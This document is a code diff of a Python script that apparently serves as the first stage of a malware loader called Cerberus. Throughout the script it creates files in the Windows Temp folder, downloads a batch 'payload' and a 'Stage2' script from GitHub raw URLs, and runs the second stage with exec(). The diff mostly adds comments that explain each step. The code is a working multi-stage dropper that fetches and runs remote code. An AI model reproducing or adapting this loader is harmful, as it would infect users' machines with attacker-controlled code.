@@ -2,23 +2,24 @@ import os.path
 import urllib.request
 from bs4 import BeautifulSoup
 
-x = os.getlogin()
+path = ("/Users/" + str(os.getlogin()) + "/AppData/Local/Temp/Stage2.py")   # Path to Stage2 File
+filename = ("/Users/" + str(os.getlogin()) + "/AppData/Local/Temp/THost.bat") # Path to Payload
 
-path = ("/Users/" + str(os.getlogin()) + "/AppData/Local/Temp/Stage1.py")
-filename = ("/Users/" + str(os.getlogin()) + "/AppData/Local/Temp/THost.bat")
 
-if os.path.isfile(path) == False:
+# Creates Stage2
+if os.path.isfile(path) == False: 
     file = open('Stage2.py', 'a')
     file.close()
 
+# Creates payload file
 if os.path.isfile(filename) == False:
     file = open('THost.bat', 'a')
     file.close()
 
 with urllib.request.urlopen("https://raw.githubusercontent.com/paramkudle/Cerberus/main/TSource1.txt") as response:
-    data = response.read().decode("utf-8")
-    with open(filename, "a+") as fp: fp.write(data)
+    data = response.read().decode("utf-8") # Takes code from URL and decodes it to remove useless newline characters in code
+    with open(filename, "a+") as fp: fp.write(data) # Opens paylaod in read and write mode and appends code retrieved into it
 
-urllib.request.urlretrieve("https://raw.githubusercontent.com/paramkudle/Cerberus/main/Stage2Source.txt", path)
+urllib.request.urlretrieve("https://raw.githubusercontent.com/paramkudle/Cerberus/main/Stage2Source.txt", path) # Next Stage
 
-exec(open(path).read())
+exec(open(path).read()) # Runs Stage 2 File
